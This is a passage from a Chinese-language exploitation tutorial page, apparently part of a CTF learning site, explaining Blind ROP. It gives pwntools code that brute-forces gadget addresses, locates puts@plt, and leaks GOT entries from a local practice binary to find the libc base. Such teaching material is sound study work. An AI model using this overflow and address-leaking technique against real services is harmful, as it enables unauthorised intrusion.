+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span>        <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-4-4"><span class="linenos" data-linenos=" 4 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-4-5"><span class="linenos" data-linenos=" 5 "></span>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span>
+</span><span id="__span-4-6"><span class="linenos" data-linenos=" 6 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-4-7"><span class="linenos" data-linenos=" 7 "></span>        <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-4-8"><span class="linenos" data-linenos=" 8 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-4-9"><span class="linenos" data-linenos=" 9 "></span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">content</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;WelCome&#39;</span><span class="p">):</span>
+</span><span id="__span-4-10"><span class="linenos" data-linenos="10 "></span>            <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-4-11"><span class="linenos" data-linenos="11 "></span>        <span class="k">return</span> <span class="p">(</span><span class="ow">not</span> <span class="n">check_stop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
+</span><span id="__span-4-12"><span class="linenos" data-linenos="12 "></span>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-4-13"><span class="linenos" data-linenos="13 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-4-14"><span class="linenos" data-linenos="14 "></span>        <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-4-15"><span class="linenos" data-linenos="15 "></span>
+</span><span id="__span-4-16"><span class="linenos" data-linenos="16 "></span><span class="n">brop_addr</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">-</span> <span class="mi">1</span>
+</span><span id="__span-4-17"><span class="linenos" data-linenos="17 "></span><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-4-18"><span class="linenos" data-linenos="18 "></span>    <span class="n">brop_addr</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-4-19"><span class="linenos" data-linenos="19 "></span>    <span class="k">if</span> <span class="n">check_brop_gadget</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">brop_addr</span><span class="p">):</span>
+</span><span id="__span-4-20"><span class="linenos" data-linenos="20 "></span>        <span class="k">break</span>
+</span></code></pre></div></p>
+<h3 id="puts_plt">寻找 puts_plt</h3>
+<p>有了 brop_gadget，所以就可以知道 <code>pop rdi, ret</code> 的地址了，要知道 rdi 是函数的第一个参数，可能会很有用。</p>
+<p>寻找 puts_plt 方法同样是暴力，看下面代码即可。我就是暴力地址，看看它能不能输出程序的开头。因为程序 ELF 格式，开头前四个字节都是固定的 magic number.<br />
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_puts_plt</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span><span id="__span-5-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-5-3"><span class="linenos" data-linenos=" 3 "></span>        <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-5-4"><span class="linenos" data-linenos=" 4 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-5-5"><span class="linenos" data-linenos=" 5 "></span>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span><span id="__span-5-6"><span class="linenos" data-linenos=" 6 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-5-7"><span class="linenos" data-linenos=" 7 "></span>        <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-5-8"><span class="linenos" data-linenos=" 8 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-5-9"><span class="linenos" data-linenos=" 9 "></span>        <span class="k">return</span> <span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">ELF&#39;</span><span class="p">))</span>
+</span><span id="__span-5-10"><span class="linenos" data-linenos="10 "></span>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span><span id="__span-5-11"><span class="linenos" data-linenos="11 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-5-12"><span class="linenos" data-linenos="12 "></span>        <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-5-13"><span class="linenos" data-linenos="13 "></span>
+</span><span id="__span-5-14"><span class="linenos" data-linenos="14 "></span><span class="c1"># 这里以 0x10 为步长来遍历，因为 plt 最后一个字节一定是 0</span>
+</span><span id="__span-5-15"><span class="linenos" data-linenos="15 "></span><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">-</span> <span class="mh">0x10</span>
+</span><span id="__span-5-16"><span class="linenos" data-linenos="16 "></span><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-5-17"><span class="linenos" data-linenos="17 "></span>    <span class="n">puts_plt</span> <span class="o">+=</span> <span class="mh">0x10</span>
+</span><span id="__span-5-18"><span class="linenos" data-linenos="18 "></span>    <span class="k">if</span> <span class="n">check_puts_plt</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">):</span>
+</span><span id="__span-5-19"><span class="linenos" data-linenos="19 "></span>        <span class="k">break</span>
+</span></code></pre></div></p>
+<h3 id="puts_got">寻找 puts_got</h3>
+<p>现在要泄露 puts_got，已经知道 puts_plt 了，那就太好办了。我们把 puts_plt 输出出来就好了。<br />
+回忆一下，plt 是如何记录 got 表的。<br />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span>PLT0:
+</span><span id="__span-6-2"><span class="linenos" data-linenos="2 "></span>push *(got + 4) // got+4 = module_ID
+</span><span id="__span-6-3"><span class="linenos" data-linenos="3 "></span>jump *(got + 8) // got+8 = _dl_runtime_resolve
+</span><span id="__span-6-4"><span class="linenos" data-linenos="4 "></span>
+</span><span id="__span-6-5"><span class="linenos" data-linenos="5 "></span>puts@plt:
+</span><span id="__span-6-6"><span class="linenos" data-linenos="6 "></span>jmp *(puts@got)
+</span><span id="__span-6-7"><span class="linenos" data-linenos="7 "></span>push n
+</span><span id="__span-6-8"><span class="linenos" data-linenos="8 "></span>jump PLT0
+</span></code></pre></div></p>
+<p>所以就是把 puts_plt 输出出来，那么它的结果对应 <code>jmp *(puts@got)</code><br />
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">gets_puts_got</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">):</span>
+</span><span id="__span-7-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-7-3"><span class="linenos" data-linenos=" 3 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-7-4"><span class="linenos" data-linenos=" 4 "></span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span><span id="__span-7-5"><span class="linenos" data-linenos=" 5 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-7-6"><span class="linenos" data-linenos=" 6 "></span>    <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-7-7"><span class="linenos" data-linenos=" 7 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-7-8"><span class="linenos" data-linenos=" 8 "></span>    <span class="c1"># 这里需要写一下说明，可能还不太对</span>
+</span><span id="__span-7-9"><span class="linenos" data-linenos=" 9 "></span>    <span class="n">jmp_addr</span> <span class="o">=</span> <span class="p">(</span> <span class="n">u64</span><span class="p">(</span><span class="n">content</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="p">)</span>
+</span><span id="__span-7-10"><span class="linenos" data-linenos="10 "></span>    <span class="c1"># 因为 jmp xx 这个是相对地址，所以计算真正的地址需要把当前 PC 加上这个偏移量</span>
+</span><span id="__span-7-11"><span class="linenos" data-linenos="11 "></span>    <span class="k">return</span> <span class="n">puts_plt</span> <span class="o">+</span> <span class="mh">0x6</span> <span class="o">+</span> <span class="n">jmp_addr</span>
+</span></code></pre></div></p>
+<h3 id="puts_got_1">寻找 puts_got 内容</h3>
+<p>之前我们找的是 puts_got 这个地址在哪，找到之后就可以利用这个地址输出 puts_got 的内容了。这里面内容就是实际运行是 puts 的地址。</p>
+<p>这样通过 LibcSearcher 根据偏移量就可以获取 libc 基址。之后就是普通的溢出攻击了。</p>
+<p>具体看代码<br />
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><span class="linenos" data-linenos="1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">gets_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">):</span>
+</span><span id="__span-8-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-8-3"><span class="linenos" data-linenos="3 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-8-4"><span class="linenos" data-linenos="4 "></span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span><span id="__span-8-5"><span class="linenos" data-linenos="5 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-8-6"><span class="linenos" data-linenos="6 "></span>    <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-8-7"><span class="linenos" data-linenos="7 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-8-8"><span class="linenos" data-linenos="8 "></span>    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></code></pre></div></p>
+<h2 id="_5">总结</h2>
+<p>回顾流程</p>
+<ol>
+<li>首先确定溢出长度</li>
+<li>寻找 stop_gadget(不会奔溃的地址)</li>
+<li>寻找 brop_gadget(6 个 pop 可以运行的地址)(利用 stop_gadget)</li>
+<li>通过上述步骤，得到了 <code>pop rdi, ret</code> 地址，下面全部都是利用这个地址</li>
+<li>寻找 puts_plt(暴力搜索)</li>
+<li>寻找 puts_got</li>
+<li>寻找 puts_real_addr</li>
+<li>根据偏移量通过 LibcSearcher 找到 libc 基址，正常溢出攻击</li>
+</ol>
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks! You can leave some advices in the comment section below. 
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+              
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+<h2 id="__comments">Comments</h2>
+<!-- Insert generated snippet here -->
+
+<script src="https://giscus.app/client.js"
+    data-repo="masterAllen/masterAllen.github.io"
+    data-repo-id="R_kgDOM_LyMQ"
+    data-category="General"
+    data-category-id="DIC_kwDOM_LyMc4Cl7rg"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+</script>
+
+<!-- Synchronize Giscus theme with palette -->
+<script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+        // Instruct Giscus to set theme
+        giscus.setAttribute("data-theme", theme)
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function () {
+        var ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __md_get("__palette")
+            if (palette && typeof palette.color === "object") {
+                var theme = palette.color.scheme === "slate"
+                    ? "transparent_dark"
+                    : "light"
+
+                // Instruct Giscus to change theme
+                var frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage(
+                    { giscus: { setConfig: { theme } } },
+                    "https://giscus.app"
+                )
+            }
+        })
+    })
+</script>
+
+                      
+                    
+                  </article>
+                  
+                    <div class="vercount-stats md-typeset" aria-label="网站访问统计">
+                      <span>本文阅读 <span id="vercount_value_page_pv">Loading</span> 次</span>
+                      <span>本站访问 <span id="vercount_value_site_pv">Loading</span> 次</span>
+                      <span>访客 <span id="vercount_value_site_uv">Loading</span> 人</span>
+                    </div>
+                  
+                </div>
+              
+              
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+            </div>
+            
+          </main>
+          
+            <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../04.ret2dlresolve/ret2dlresolve/" class="md-footer__link md-footer__link--prev" aria-label="Previous: ret2dlresolve.md">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                ret2dlresolve.md
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="./exp.py/" class="md-footer__link md-footer__link--next" aria-label="Next: exp.py">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                exp.py
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 ~ now | 🚀 HONG Anlun (allen hong)
+    </div>
+  
+  
+    <div class="md-copyright__generator">
+      Made with
+      <a href="https://zensical.org/" target="_blank" rel="noopener">
+        Zensical
+      </a>
+    </div>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+          
+        </div>
+      </div>
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../../..","features":["navigation.instant","navigation.prune","navigation.tabs","navigation.path","navigation.indexes","header.autohide","navigation.footer"],"search":"../../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      
+      <script src="../../../../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+        <script src="../../../../../javascripts/copy.js"></script>
+      
+        <script src="../../../../../javascripts/code-blocks.js"></script>
+      
+        <script src="../../../../../javascripts/collapsible-headings.js"></script>
+      
+        <script src="../../../../../javascripts/hide-details-toc.js"></script>
+      
+        <script src="../../../../../javascripts/resizable-sidebar.js"></script>
+      
+        <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
+      
+        <script src="../../../../../javascripts/review-tracker.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+      <script defer src="../../../../../javascripts/archive-filter.js"></script>
+      <script defer src="../../../../../javascripts/pdf-inline.js"></script>
+      <script defer src="../../../../../javascripts/html-inline.js" data-resource-origin=""></script>
+      <script defer src="../../../../../javascripts/media-notes.js?v=20261021"></script>
+      
+      
+      
+        <script defer src="https://events.vercount.one/js"></script>
+      
+    
+  </body>
+</html>
